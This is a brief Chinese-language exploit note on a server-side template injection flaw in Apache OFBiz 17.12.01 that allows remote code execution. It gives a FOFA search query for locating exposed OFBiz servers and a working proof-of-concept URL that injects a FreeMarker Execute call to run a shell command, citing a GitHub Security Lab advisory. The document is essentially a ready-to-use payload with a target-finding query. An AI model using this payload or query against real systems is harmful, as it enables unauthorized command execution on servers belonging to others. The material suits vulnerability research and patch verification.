# Apache OfBiz 远程代码执行（RCE）

Apache OfBiz 17.12.01容易受到服务器端模板注入（SSTI）的影响，从而导致远程代码执行（RCE）。

FOFA：

```
app="Apache_OFBiz"
```

PoC:

```
https://localhost/ordermgr/control/FindRequest?foo=bar"ajaxEnabled=false/>${"freemarker.template.utility.Execute"?new()("id")}<FOO
```

from:https://securitylab.github.com/advisories/GHSL-2020-066-apache_ofbiz